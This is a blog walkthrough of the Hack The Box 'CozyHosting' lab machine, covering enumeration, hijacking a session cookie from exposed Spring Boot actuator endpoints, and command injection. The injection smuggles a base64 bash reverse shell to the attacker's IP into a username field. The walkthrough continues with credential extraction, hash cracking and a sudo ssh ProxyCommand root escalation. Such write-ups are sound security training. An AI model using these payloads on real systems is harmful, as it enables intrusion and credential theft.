@@ -1,0 +1,223 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="Hack the box - CozyHosting pwned!" /><meta property="og:locale" content="en" /><meta name="description" content="Machine info" /><meta property="og:description" content="Machine info" /><link rel="canonical" href="https://rubenhortas.github.io/posts/htb-cozyhosting/" /><meta property="og:url" content="https://rubenhortas.github.io/posts/htb-cozyhosting/" /><meta property="og:site_name" content="rubenhortas@blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-02-17T01:00:01+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack the box - CozyHosting pwned!" /><meta name="twitter:site" content="@rubenhortas" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-09-06T23:36:19+02:00","datePublished":"2024-02-17T01:00:01+01:00","description":"Machine info","headline":"Hack the box - CozyHosting pwned!","mainEntityOfPage":{"@type":"WebPage","@id":"https://rubenhortas.github.io/posts/htb-cozyhosting/"},"url":"https://rubenhortas.github.io/posts/htb-cozyhosting/"}</script><title>Hack the box - CozyHosting pwned! | rubenhortas@blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="rubenhortas@blog"><meta name="application-name" content="rubenhortas@blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">rubenhortas@blog</a></div><div class="site-subtitle font-italic">Learning everyday</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="javascript:location.href = 'mailto:' + ['rubenhortas','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/rubenhortas" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/rubenhortas" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/rubenhortas" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack the box - CozyHosting pwned!</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Hack the box - CozyHosting pwned!</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1708128001" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 17, 2024 </em> </span> <span> Updated <em class="" data-ts="1757194579" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 6, 2025 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/rubenhortas">Rubén Hortas</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1336 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><h2 id="machine-info"><span class="mr-2">Machine info</span><a href="#machine-info" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="/assets/img/posts/htb-cozyhosting-info.png" class="popup img-link "><img data-src="/assets/img/posts/htb-cozyhosting-info.png" alt="CozyHosting" class="lazyload" data-proofer-ignore></a> <em>CozyHosting info</em></p><h2 id="annotations"><span class="mr-2">Annotations</span><a href="#annotations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote class="prompt-info"><p>In this article we are going to assume the following ip addresses:</p><p>Local machine (attacker, local host): 10.10.16.96</p><p>Target machine (victim, CozyHosting): 10.10.11.230</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s go look for the open ports in the machine using <code class="language-plaintext highlighter-rouge">nmap</code>:</p><p><code class="language-plaintext highlighter-rouge">sudo nmap -Pn -n -sS -p- -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.230</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+4646/tcp open  dots-signal
+4848/tcp open  appserv-http
+8083/tcp open  us-srv
+</pre></table></code></div></div><h2 id="footprinting"><span class="mr-2">Footprinting</span><a href="#footprinting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We fine tune the scan to see if we can get more information about the running services:</p><p><code class="language-plaintext highlighter-rouge">sudo nmap -Pn -n -sVC -p22,80,4646,4848,8083 -oN nmap_initial_versions.txt 10.10.11.230</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
+|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
+80/tcp   open  http          nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://cozyhosting.htb
+4646/tcp open  dots-signal?
+4848/tcp open  appserv-http?
+8083/tcp open  us-srv?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre></table></code></div></div><p>We can see that there is a web service running on port 80 pointing to <code class="language-plaintext highlighter-rouge">http://cozyhosting.htb</code>, so let’s start there. First of all, we add the machine address to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p><p><code class="language-plaintext highlighter-rouge">echo "http://cozyhosting.htb" | sudo tee -a /etc/hosts</code></p><p>We browse to <code class="language-plaintext highlighter-rouge">http://cozyhosting.htb</code> to investigate the web:</p><p><a href="/assets/img/posts/htb-cozyhosting-web.png" class="popup img-link "><img data-src="/assets/img/posts/htb-cozyhosting-web.png" alt="CozyHosting" class="lazyload" data-proofer-ignore></a> <em>CozyHosting web</em></p><p>Using <code class="language-plaintext highlighter-rouge">wappalyzer</code> we can see that is programmed in java:</p><p><a href="/assets/img/posts/htb-cozyhosting-web-wappalyzer.png" class="popup img-link "><img data-src="/assets/img/posts/htb-cozyhosting-web-wappalyzer.png" alt="CozyHosting" class="lazyload" data-proofer-ignore></a> <em>CozyHosting web wappalyzer</em></p><p>We can’t do anything in the web, so we will fuzzing with <code class="language-plaintext highlighter-rouge">gobuster</code> to find hidden resources:</p><p><code class="language-plaintext highlighter-rouge">gobuster dir -u http://cozyhosting.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 403,404,301</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre>[+] Url:                     http://cozyhosting.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404,301
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index                (Status: 200) [Size: 12706]
+/login                (Status: 200) [Size: 4431]
+/admin                (Status: 401) [Size: 97]
+/logout               (Status: 204) [Size: 0]
+/error                (Status: 500) [Size: 73]
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">/admin</code> is very interesting, but, if we look at <code class="language-plaintext highlighter-rouge">/error</code>, we can see that the “white label error” is a <code class="language-plaintext highlighter-rouge">spring boot</code> error:</p><p><a href="/assets/img/posts/htb-cozyhosting-web-white-label-error.png" class="popup img-link "><img data-src="/assets/img/posts/htb-cozyhosting-web-white-label-error.png" alt="CozyHosting" class="lazyload" data-proofer-ignore></a> <em>CozyHosting white label error</em></p><p>So let’s fuzz with a <code class="language-plaintext highlighter-rouge">spring boot</code> dictionary:</p><p><code class="language-plaintext highlighter-rouge">gobuster dir -u http://cozyhosting.htb -w /opt/SecLists/Discovery/Web-Content/spring-boot.txt</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>[+] Url:                     http://cozyhosting.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/spring-boot.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/actuator             (Status: 200) [Size: 634]
+/actuator/env/lang    (Status: 200) [Size: 487]
+/actuator/env         (Status: 200) [Size: 4957]
+/actuator/env/home    (Status: 200) [Size: 487]
+/actuator/beans       (Status: 200) [Size: 127224]
+/actuator/env/path    (Status: 200) [Size: 487]
+/actuator/health      (Status: 200) [Size: 15]
+/actuator/mappings    (Status: 200) [Size: 9938]
+/actuator/sessions    (Status: 200) [Size: 48]
+</pre></table></code></div></div><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="kanderson"><span class="mr-2">kanderson</span><a href="#kanderson" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If we look in <code class="language-plaintext highlighter-rouge">/actuator/sessions</code> we can find the cookie for the user <code class="language-plaintext highlighter-rouge">kanderson</code>:</p><p><a href="/assets/img/posts/htb-cozyhosting-web-actuator-sessions.png" class="popup img-link "><img data-src="/assets/img/posts/htb-cozyhosting-web-actuator-sessions.png" alt="CozyHosting" class="lazyload" data-proofer-ignore></a> <em>CozyHosting web actuator sessions</em></p><p>As <code class="language-plaintext highlighter-rouge">kanderson</code> is the only user that we have, let’s try if it has admin privileges in the web. We put our <code class="language-plaintext highlighter-rouge">burp suite</code> intercepting in proxy mode, and we edit the cookie values for the petitions to impersonate kanderson:</p><p><a href="/assets/img/posts/htb-cozyhosting-web-burp-impersonating-kanderson.png" class="popup img-link "><img data-src="/assets/img/posts/htb-cozyhosting-web-burp-impersonating-kanderson.png" alt="CozyHosting" class="lazyload" data-proofer-ignore></a> <em>Impersonating kanderson with burp suite</em></p><p>Ok, now as <code class="language-plaintext highlighter-rouge">kanderson</code> we can connect to a host using ssh intruducing the host and the username. Unafortunately we don’t have any, so we will get an error:</p><p><a href="/assets/img/posts/htb-cozyhosting-web-admin-panel-ssh-error.png" class="popup img-link "><img data-src="/assets/img/posts/htb-cozyhosting-web-admin-panel-ssh-error.png" alt="CozyHosting" class="lazyload" data-proofer-ignore></a> <em>Cozyhosting admin panel ssh error</em></p><p>If we look closely the error we can see that it’s a bash error, so the error could be generated directly on the machine and not in the web:</p><p><a href="/assets/img/posts/htb-cozyhosting-web-admin-panel-ssh-error-detail.png" class="popup img-link "><img data-src="/assets/img/posts/htb-cozyhosting-web-admin-panel-ssh-error-detail.png" alt="CozyHosting" class="lazyload" data-proofer-ignore></a> <em>Cozyhosting admin panel ssh error detail</em></p><p>We take a closer look at the petition to the request made using <code class="language-plaintext highlighter-rouge">burp suite</code> and we can see that <code class="language-plaintext highlighter-rouge">/bin/bash</code> it’s being called:</p><p><a href="/assets/img/posts/htb-cozyhosting-web-admin-panel-ssh-error-burp.png" class="popup img-link "><img data-src="/assets/img/posts/htb-cozyhosting-web-admin-panel-ssh-error-burp.png" alt="CozyHosting" class="lazyload" data-proofer-ignore></a> <em>Cozyhosting admin panel ssh error in burp</em></p><h3 id="reverse-shell"><span class="mr-2">Reverse shell</span><a href="#reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>As it seems that the parameters are sent without sanitization to the system, we will try to inject here a reverse bash shell using <code class="language-plaintext highlighter-rouge">burp suite</code>. We start listening in our machine:</p><p><code class="language-plaintext highlighter-rouge">nc -lvnp 1234</code></p><p>Now, we generate our shell. As the only input sanitization is that the username can’t contain spaces, we will encode it in base64.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>echo "bash -i &gt;&amp; /dev/tcp/10.10.16.96/1234 0&gt;&amp;1" | base64 -w 0
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK
+</pre></table></code></div></div><p>As we need to our shell will be executed as <code class="language-plaintext highlighter-rouge">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK|base64 -d|bash</code> in the target, and we can’t use whitespaces, we will take advantage of <a href="https://en.wikipedia.org/wiki/Input_Field_Separators">Input Field Separators (IFS)</a>. We are going to replace the whitespaces with <code class="language-plaintext highlighter-rouge">${IFS}</code>:</p><p><code class="language-plaintext highlighter-rouge">echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK|base64${IFS}-d|bash</code></p><p>Our payload for the <code class="language-plaintext highlighter-rouge">username</code> parameter will be:</p><p><code class="language-plaintext highlighter-rouge">user;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK|base64${IFS}-d|bash</code></p><p>As our payload contains special characters, we will url-encode it using <code class="language-plaintext highlighter-rouge">burp suite</code>: Select text -&gt; right click -&gt; Convert selection -&gt; URL -&gt; URL-encode key characters (CTRL+U):</p><p><a href="/assets/img/posts/htb-cozyhosting-web-admin-panel-ssh-payload.png" class="popup img-link "><img data-src="/assets/img/posts/htb-cozyhosting-web-admin-panel-ssh-payload.png" alt="CozyHosting" class="lazyload" data-proofer-ignore></a> <em>Cozyhosting admin panel ssh payload</em></p><p>We send it and… We have our shell!</p><h3 id="app"><span class="mr-2">app</span><a href="#app" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Fist of all, as always, it’s upgrading our tty:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>script /dev/null -c bash
+ctrl+z
+stty raw -echo;fg
+reset xterm
+export TERM=xterm-256color
+stty rows 56 columns 209
+</pre></table></code></div></div><p>We take a look at a new user:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>app@cozyhosting:/app$ id
+uid=1001(app) gid=1001(app) groups=1001(app)
+</pre></table></code></div></div><p>We look at what files the app user has:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>app@cozyhosting:/app$ ls -lA
+cloudhosting-0.0.1.jar
+</pre></table></code></div></div><p>And we look for other uses in the system:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>app@cozyhosting:/app$ ls -lA /home
+drwxr-x--- 3 josh josh 4096 Aug  8  2023 josh
+</pre></table></code></div></div><p>We download the file, as we don’t have permissions to run <code class="language-plaintext highlighter-rouge">netcat</code> we will start a python web server:</p><p><code class="language-plaintext highlighter-rouge">app@cozyhosting:/app$ python3 -m http.server 12345</code></p><p>And we download the file in our host using <code class="language-plaintext highlighter-rouge">wget</code>:</p><p><code class="language-plaintext highlighter-rouge">wget 10.10.11.230:12345/cloudhosting-0.0.1.jar</code></p><p>We extract the <code class="language-plaintext highlighter-rouge">cloudhosting-0.0.1.jar</code> file in our host and we take a look at the files content. After a while, we will find interesting information in <code class="language-plaintext highlighter-rouge">BOOT-INF/classes/application.properties</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&amp;nvzAQ7XxR
+</pre></table></code></div></div><p>We have a <code class="language-plaintext highlighter-rouge">postgres</code> database in the localhost, an user and a password, so let’s investigate!</p><p><code class="language-plaintext highlighter-rouge">app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres</code></p><p>We list the databases:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>postgres=# \l
+                                   List of databases
+    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
+-------------+----------+----------+-------------+-------------+-----------------------
+ cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
+ postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
+ template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+             |          |          |             |             | postgres=CTc/postgres
+ template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+             |          |          |             |             | postgres=CTc/postgres
+</pre></table></code></div></div><p>We select <code class="language-plaintext highlighter-rouge">cozyhosting</code> and we list the tables:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>postgres=# \c cozyhosting
+
+cozyhosting=# \dt
+         List of relations
+ Schema | Name  | Type  |  Owner
+--------+-------+-------+----------
+ public | hosts | table | postgres
+ public | users | table | postgres
+(2 rows)
+</pre></table></code></div></div><p>We take a look at the users data:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>cozyhosting=# select * from users;
+   name    |                           password                           | role
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+</pre></table></code></div></div><p>Now, we have two hashes. As we was <code class="language-plaintext highlighter-rouge">kanderson</code> before, we will crack the <code class="language-plaintext highlighter-rouge">admin</code> hash. We add the admin hash to the <code class="language-plaintext highlighter-rouge">admin_hash.txt</code> file, and we crack it using <code class="language-plaintext highlighter-rouge">hashcat</code>:</p><p><code class="language-plaintext highlighter-rouge">echo $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm &gt; admin_hash.txt</code></p><p><code class="language-plaintext highlighter-rouge">hashcat -a 0 -m 3200 admin_hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></p><h3 id="josh"><span class="mr-2">josh</span><a href="#josh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Ok, now we have a password and two possible users: <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">josh</code>. So we will try them to connect using <code class="language-plaintext highlighter-rouge">ssh</code>. As <code class="language-plaintext highlighter-rouge">admin</code> does not work, let’s try <code class="language-plaintext highlighter-rouge">josh</code>:</p><p><code class="language-plaintext highlighter-rouge">ssh josh@10.10.11.230</code></p><p>We are in!</p><p>Let’s take a look at our new user’s info and see what he can do:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>josh@cozyhosting:~$ id
+uid=1003(josh) gid=1003(josh) groups=1003(josh)
+josh@cozyhosting:~$ sudo -l
+[sudo] password for josh:
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+</pre></table></code></div></div><h2 id="privilege-escalation"><span class="mr-2">Privilege escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>As we can see in <a href="https://gtfobins.github.io">GTFOBins</a> we can <a href="https://gtfobins.github.io/gtfobins/ssh">exploit ssh</a>:</p><p><code class="language-plaintext highlighter-rouge">josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x</code></p><p>And, now, we can get our system flag!</p><h2 id="pwned"><span class="mr-2">Pwned!</span><a href="#pwned" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="/assets/img/posts/htb-cozyhosting-pwned.png" class="popup img-link "><img data-src="/assets/img/posts/htb-cozyhosting-pwned.png" alt="CozyHosting" class="lazyload" data-proofer-ignore></a> <em>CozyHosting has been Pwned</em></p><p><em>Enjoy! ;)</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>hack the box</a>, <a href='/categories/machine/'>machine</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/cozyhosting/" class="post-tag no-text-decoration" >cozyhosting</a> <a href="/tags/spring-boot/" class="post-tag no-text-decoration" >spring boot</a> <a href="/tags/postgres/" class="post-tag no-text-decoration" >postgres</a> <a href="/tags/sudo-proxycommand/" class="post-tag no-text-decoration" >sudo proxycommand</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack%20the%20box%20-%20CozyHosting%20pwned!%20-%20rubenhortas@blog&url=https%3A%2F%2Frubenhortas.github.io%2Fposts%2Fhtb-cozyhosting%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab 